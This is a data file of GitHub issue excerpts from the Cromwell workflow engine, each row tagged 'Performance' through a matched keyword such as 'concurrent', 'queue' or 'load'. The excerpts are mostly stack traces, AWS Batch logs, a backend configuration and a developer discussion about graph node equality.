Performance,"1.apply(TraversableLike .scala:245); > at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike .scala:245); > at scala.collection.mutable.ResizableArray$class.foreach(ResizableArray. scala:59); > at scala.collection.mutable.ArrayBuffer.foreach(ArrayBuffer.scala:48); > at scala.collection.TraversableLike$class.map(TraversableLike.scala:245); > at scala.collection.AbstractTraversable.map(Traversable.scala:104); > at cromwell.engine.backend.local.SharedFileSystem$class.adjustSharedInpu tPaths(SharedFileSystem.scala:220); > at cromwell.engine.backend.local.LocalBackend.adjustSharedInputPaths(Loc alBackend.scala:94); > at cromwell.engine.backend.local.LocalBackend.adjustInputPaths(LocalBack end.scala:96); > at cromwell.engine.backend.local.LocalBackend.instantiateCommand(LocalBa ckend.scala:246); > at cromwell.engine.backend.BackendCallJobDescriptor.instantiateCommand$l zycompute(JobDescriptor.scala:52); > at cromwell.engine.backend.BackendCallJobDescriptor.instantiateCommand(J obDescriptor.scala:52); > at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(L ocalBackend.scala:115); > at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(L ocalBackend.scala:113); > at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1( Future.scala:24); > at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.sca la:24); > at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); > at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(Abst ractDispatcher.scala:397); > at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); > at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool .java:1339); > at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:19 79); > at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThre ad.java:107). I tried to use Cygwin, cause it transforms `c:\` into `/cygdrive/c` , but i get the same error.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1016:3216,concurren,concurrent,3216,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1016,6,['concurren'],['concurrent']
Performance,1.applyOrElse(JesInitializationActor.scala:62); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.core.CromwellFatalException: com.google.cloud.storage.StorageException: Connection has been shutdown: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at cromwell.core.CromwellFatalException$.apply(core.scala:17); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:36); 	... 15 more; Caused by: com.google.cloud.storage.StorageException: Connection has been shutdown: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at com.google.cloud.storage.spi.DefaultStorageRpc.translate(DefaultStorageRpc.java:202); 	at com.google.cloud.st,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:1602,concurren,concurrent,1602,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,1,['concurren'],['concurrent']
Performance,"1.applyOrElse(JesInitializationActor.scala:80); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.cloud.storage.StorageException: 503 Service Unavailable; {; ""error"": {; ""errors"": [; {; ""domain"": ""global"",; ""reason"": ""backendError"",; ""message"": ""Backend Error""; }; ],; ""code"": 503,; ""message"": ""Backend Error""; }; }. 	at com.google.cloud.storage.spi.DefaultStorageRpc.translate(DefaultStorageRpc.java:190); 	at com.google.cloud.storage.spi.DefaultStorageRpc.write(DefaultStorageRpc.java:536); 	at com.google.cloud.storage.BlobWriteChannel$1.run(BlobWriteChannel.java:49); 	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); 	at com.google.cloud.RetryHelper.doRetry(RetryHelper.java:179); 	at com.google.cloud.RetryHelper.runWithRetries(RetryH",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1924:1867,concurren,concurrent,1867,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1924,1,['concurren'],['concurrent']
Performance,108); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.$anonfun$updateStatuses$4(OccasionalStatusPollingActor.scala:103); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.updateForStatusNames$1(OccasionalStatusPollingActor.scala:101); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.cromwell$backend$impl$aws$OccasionalStatusPollingActor$$updateStatuses(OccasionalStatusPollingActor.scala:118); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor$$anonfun$receive$1.$anonfun$applyOrElse$1(OccasionalStatusPollingActor.scala:57); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.Future$.$anonfun$apply$1(Future.scala:659); 	at scala.util.Success.$anonfun$map$1(Try.scala:255); 	at scala.util.Success.map(Try.scala:213); 	at scala.concurrent.Future.$anonfun$map$1(Future.scala:292); 	at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:33); 	at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:33); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:6321,concurren,concurrent,6321,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['concurren'],['concurrent']
Performance,122); 	at cromwell.backend.impl.jes.Run$.machineType$lzycompute$1(Run.scala:123); 	at cromwell.backend.impl.jes.Run$.machineType$1(Run.scala:123); 	at cromwell.backend.impl.jes.Run$.interpretOperationStatus(Run.scala:130); 	at cromwell.backend.impl.jes.statuspolling.JesPollingActor.interpretOperationStatus(JesPollingActor.scala:86); 	at cromwell.backend.impl.jes.statuspolling.JesPollingActor$$anon$1.onSuccess(JesPollingActor.scala:72); 	at cromwell.backend.impl.jes.statuspolling.JesPollingActor$$anon$1.onSuccess(JesPollingActor.scala:69); 	at com.google.api.client.googleapis.batch.BatchUnparsedResponse.parseAndCallback(BatchUnparsedResponse.java:197); 	at com.google.api.client.googleapis.batch.BatchUnparsedResponse.parseNextResponse(BatchUnparsedResponse.java:155); 	at com.google.api.client.googleapis.batch.BatchRequest.execute(BatchRequest.java:253); 	at cromwell.backend.impl.jes.statuspolling.JesPollingActor.runBatch(JesPollingActor.scala:67); 	at cromwell.backend.impl.jes.statuspolling.JesPollingActor.cromwell$backend$impl$jes$statuspolling$JesPollingActor$$handleBatch(JesPollingActor.scala:58); 	at cromwell.backend.impl.jes.statuspolling.JesPollingActor$$anonfun$receive$1.applyOrElse(JesPollingActor.scala:36); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:496); 	at cromwell.backend.impl.jes.statuspolling.JesPollingActor.aroundReceive(JesPollingActor.scala:23); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1915:2956,concurren,concurrent,2956,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1915,4,['concurren'],['concurrent']
Performance,"126ac4000]; java.lang.Thread.State: WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.Object.wait(Object.java:502); at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:157); - locked <0x00000006c00301d8> (a java.lang.ref.Reference$Lock). ""main"" #1 prio=5 os_prio=31 tid=0x00007fb76a803000 nid=0xf07 waiting on condition [0x000000010b088000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c061d308> (a scala.concurrent.impl.Promise$CompletionLatch); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at scala.concurrent.impl.Promise$DefaultPromise.tryAwait(Promise.scala:199); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala); at scala.concurrent.Await$.ready(package.scala:169); at cromwell.Main.cromwell$Main$$waitAndExit(Main.scala); at cromwell.Main$$anonfun$runServer$2.apply$mcI$sp(Main.scala:109); at cromwell.Main.continueIf(Main.scala); at cromwell.Main.runServer(Main.scala:109); at cromwell.Main.runAction(Main.scala:103); at cromwell.Main$.delayedEndpoint$cromwell$Main$1(Main.scala:49); at cromwell.Main$delayedInit$body.apply(Main.scala); at scala.Function0$class.apply$mcV$sp(Function0.scala); at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala); at scala.App$$anonfun$main$1.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:50928,concurren,concurrent,50928,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,153); at wdl4s.formatter.SyntaxFormatter$$anonfun$2.applyOrElse(SyntaxFormatter.scala:73); at wdl4s.formatter.SyntaxFormatter$$anonfun$2.applyOrElse(SyntaxFormatter.scala:73); at scala.PartialFunction$$anonfun$runWith$1.apply(PartialFunction.scala:141); at scala.PartialFunction$$anonfun$runWith$1.apply(PartialFunction.scala:140); at scala.collection.Iterator$class.foreach(Iterator.scala:893); at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); at scala.collection.AbstractIterable.foreach(Iterable.scala:54); at scala.collection.TraversableLike$class.collect(TraversableLike.scala:271); at scala.collection.AbstractTraversable.collect(Traversable.scala:104); at wdl4s.formatter.SyntaxFormatter.format(SyntaxFormatter.scala:73); at wdltool.Main$$anonfun$highlight$2$$anonfun$apply$2.apply(Main.scala:52); at wdltool.Main$$anonfun$highlight$2$$anonfun$apply$2.apply(Main.scala:50); at wdltool.Main$.wdltool$Main$$loadWdl(Main.scala:98); at wdltool.Main$$anonfun$highlight$2.apply(Main.scala:50); at wdltool.Main$$anonfun$highlight$2.apply(Main.scala:50); at wdltool.Main$.continueIf(Main.scala:94); at wdltool.Main$.highlight(Main.scala:49); at wdltool.Main$.dispatchCommand(Main.scala:34); at wdltool.Main$.delayedEndpoint$wdltool$Main$1(Main.scala:151); at wdltool.Main$delayedInit$body.apply(Main.scala:12); at scala.Function0$class.apply$mcV$sp(Function0.scala:34); at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); at scala.App$$anonfun$main$1.apply(App.scala:76); at scala.App$$anonfun$main$1.apply(App.scala:76); at scala.collection.immutable.List.foreach(List.scala:381); at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala:35); at scala.App$class.main(App.scala:76); at wdltool.Main$.main(Main.scala:12); at wdltool.Main.main(Main.scala). ```. ---. @geoffjentry commented on [Thu Jan 26 2017](https://github.com/broadinstitute/wdltool/issu,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2878:2864,load,loadWdl,2864,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2878,1,['load'],['loadWdl']
Performance,"153039990-0d0b2c96-a33b-454f-9617-aee83137337a.PNG); [Cromwell-Error.docx](https://github.com/broadinstitute/cromwell/files/8026009/Cromwell-Error.docx); ; <!-- Paste/Attach your workflow if possible: -->; java -Dconfig.file=aws-cromwell-batch.conf -jar cromwell-75.jar run hello.wdl -i hello.inputs. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; include required(classpath(""application"")). aws {. application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; ]; region = ""us-east-1""; }; engine {; filesystems {; s3.auth = ""default""; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; docker {; hash-lookup {; enabled = false; # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub and gcr; method = ""remote""; }; }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; concurrent-job-limit = 1000; root = ""s3://cromwell-aws-hello/cromwell-execution""; auth = ""default""; default-runtime-attributes {; queueArn = ""arn:aws:batch:us-east-1:XXXXXXXXX:job-queue/python-batch"" ,; scriptBucketName = ""cromwell-aws-hello"" ; }; filesystems {; s3 {; auth = ""default""; }; }; # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in the cloud.; slow-job-warning-time: 24 hours; }; }; }; }. [Cromwell-Error.docx](https://github.com/broadinstitute/cromwell/files/8026013/Cromwell-Error.docx); ![AWS-Batch](https://user-images.githubusercontent.com/25282254/153040332-625cb61a-062b-4766-96ea-8e129efb2b20.PNG); [config file.docx](https://github.com/broadinstitute/cromwell/files/8026025/config.file.docx). How to give Timeout options for Job definitions?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6671:2546,concurren,concurrent-job-limit,2546,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671,3,"['concurren', 'queue']","['concurrent-job-limit', 'queue', 'queueArn']"
Performance,"16-01-31 16:37:29,61] [error] Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0 transitioned to state Failed; java.lang.Throwable: Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0 transitioned to state Failed; at cromwell.engine.workflow.SingleWorkflowRunnerActor$RunnerData.addFailure(SingleWorkflowRunnerActor.scala:41); at cromwell.engine.workflow.SingleWorkflowRunnerActor$$anonfun$2.applyOrElse(SingleWorkflowRunnerActor.scala:99); at cromwell.engine.workflow.SingleWorkflowRunnerActor$$anonfun$2.applyOrElse(SingleWorkflowRunnerActor.scala:77); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at akka.actor.FSM$class.processEvent(FSM.scala:604); at cromwell.engine.workflow.SingleWorkflowRunnerActor.akka$actor$LoggingFSM$$super$processEvent(SingleWorkflowRunnerActor.scala:52); at akka.actor.LoggingFSM$class.processEvent(FSM.scala:734); at cromwell.engine.workflow.SingleWorkflowRunnerActor.processEvent(SingleWorkflowRunnerActor.scala:52); at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:598); at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:592); at akka.actor.Actor$class.aroundReceive(Actor.scala:467); at cromwell.engine.workflow.SingleWorkflowRunnerActor.aroundReceive(SingleWorkflowRunnerActor.scala:52); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:516); at akka.actor.ActorCell.invoke(ActorCell.scala:487); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:238); at akka.dispatch.Mailbox.run(Mailbox.scala:220); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0 transitioned to state Failed; $; ```. ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:8437,concurren,concurrent,8437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,4,['concurren'],['concurrent']
Performance,"17-4c06-4f15-8607-da8261e16448/call-scatterList/execution/stdout"") (reason 1 of 1): [Attempted 1 time(s)] - IOException: Could not read from /home/devarea/karl/PathoCromwell/cromwell-executions/Agilent_Exome_Single/3f4aa8de-d1a9-419a-b9b4-10f9ed0a9d53/call-SomaticVariants/SomaticVariantcalling/0c6cefa3-4c84-497f-8003-b0d7221bedbc/call-mutect2/Mutect2/fb66e417-4c06-4f15-8607-da8261e16448/call-scatterList/execution/stdout: /home/devarea/karl/PathoCromwell/cromwell-executions/Agilent_Exome_Single/3f4aa8de-d1a9-419a-b9b4-10f9ed0a9d53/call-SomaticVariants/SomaticVariantcalling/0c6cefa3-4c84-497f-8003-b0d7221bedbc/call-mutect2/Mutect2/fb66e417-4c06-4f15-8607-da8261e16448/call-scatterList/execution/stdout; cromwell_1 | at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:973); cromwell_1 | at scala.util.Success.$anonfun$map$1(Try.scala:255) cromwell_1 | at scala.util.Success.map(Try.scala:213); cromwell_1 | at scala.concurrent.Future.$anonfun$map$1(Future.scala:292) ; cromwell_1 | at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:33) cromwell_1 | at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:33) cromwell_1 | at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64) cromwell_1 | at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) cromwell_1 | at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92) ; `. Basically cromwell fails to read a stdout file written by a job.; When we check the file it exists and contains data so i suspect some kind of IO problem. All Data is on NFS shares which are usually quite stable and we see no errors in any of the filesystem/nfs backends. It seems to mostly happen in this scatter step, so i suspect some race condition or timeout somewhere in there, however, this job was creating a scatter to 12 bed files, so its really not that big . Just re-running the job usually ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094:1834,concurren,concurrent,1834,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094,1,['concurren'],['concurrent']
Performance,"17:34:31,81] [info] jobQueueArn: arn:aws:batch:us-east-1:260062248592:job-queue/GenomicsDefaultQueue-63f905e0-1459-11e9-8f03-0a4a1f15abc2; [2019-01-10 17:34:31,81] [info] taskId: SomaticSNVInDel.MarkDuplicates-Some(1)-1; [2019-01-10 17:34:31,81] [info] hostpath root: vc.SomaticSNVInDel/vc.MarkDuplicates/127f691e-ea2e-441f-9d58-deba01a84c5e/Some(1)/1; [2019-01-10 17:34:31,81] [info] Submitting job to AWS Batch; [2019-01-10 17:34:31,81] [info] dockerImage: 267795504649.dkr.ecr.us-east-1.amazonaws.com/s4-radbinf-somaticgenomicsrd-tigris:1.2.0; [2019-01-10 17:34:31,81] [info] jobQueueArn: arn:aws:batch:us-east-1:260062248592:job-queue/GenomicsDefaultQueue-63f905e0-1459-11e9-8f03-0a4a1f15abc2; [2019-01-10 17:34:31,82] [info] taskId: SomaticSNVInDel.MarkDuplicates-Some(0)-1; [2019-01-10 17:34:31,82] [info] hostpath root: vc.SomaticSNVInDel/vc.MarkDuplicates/127f691e-ea2e-441f-9d58-deba01a84c5e/Some(0)/1; [2019-01-10 17:34:31,99] [warn] Job definition already exists. Performing describe and retrieving latest revision.; [2019-01-10 17:34:35,76] [info] AwsBatchAsyncBackendJobExecutionActor [127f691eSomaticSNVInDel.MarkDuplicates:0:1]: job id: b632db00-aef4-4463-8ccf-74be73b3c251; [2019-01-10 17:34:35,76] [info] AwsBatchAsyncBackendJobExecutionActor [127f691eSomaticSNVInDel.MarkDuplicates:1:1]: job id: 26c8aab7-48f7-4a6c-9bf0-306de3037265; [2019-01-10 17:34:35,81] [info] AwsBatchAsyncBackendJobExecutionActor [127f691eSomaticSNVInDel.MarkDuplicates:0:1]: Status change from - to Initializing; [2019-01-10 17:34:35,81] [info] AwsBatchAsyncBackendJobExecutionActor [127f691eSomaticSNVInDel.MarkDuplicates:1:1]: Status change from - to Initializing; [2019-01-10 17:36:24,60] [info] AwsBatchAsyncBackendJobExecutionActor [127f691eSomaticSNVInDel.MarkDuplicates:0:1]: Status change from Initializing to Running; [2019-01-10 17:36:32,19] [info] AwsBatchAsyncBackendJobExecutionActor [127f691eSomaticSNVInDel.MarkDuplicates:1:1]: Status change from Initializing to Running; [2019-01-10 18:21:56",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4537:2570,Perform,Performing,2570,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4537,1,['Perform'],['Performing']
Performance,"17](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334557027). `eq` is object equality. `equals` and `==` are the same, and there is no general rule that they need to be component-based (""bitwise""). On the contrary, `equals`/`==` should not be component-based if an object is mutable. Your typical GraphNode is mutable, because it indirectly contains `GraphNodeSetter`. ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334575875). I suggest we leave this as-is with the understanding that it could be a performance issue down the road. . >rework the whole thing later. This is a specific anti-goal. As I suggested, I would like to discuss w/ Chris when he gets back next week as we introduced the reference equality in the first place and I'm not aware of his motivation to do so. ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334577609). The performance issues aren't down the road. When I try to build a WOM; graph right now, it slows down after the first 100 nodes and never finishes. On Thu, Oct 5, 2017 at 4:01 PM, Dan Billings <notifications@github.com>; wrote:. > I suggest we leave this as-is with the understanding that it could be a; > performance issue down the road.; >; > rework the whole thing later; > This is a specific anti-goal.; >; > As I suggested, I would like to discuss w/ Chris when he gets back next; > week as we introduced the reference equality in the first place and I'm not; > aware of his motivation to do so.; >; > —; > You are receiving this because you were assigned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334575875>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AG_4aJnzYP8ru5JvHrjbR5jwKwO9Brncks5spTV8gaJpZM4PttJd>; > .; >. -- ; Oliver Ruebenacker; Senior Software Engineer, Diabetes Portal; <http://www.type2diab",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2694:2930,perform,performance,2930,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2694,2,['perform'],['performance']
Performance,"18-06-07 12:16:52,362 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurren",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99274,concurren,concurrent,99274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
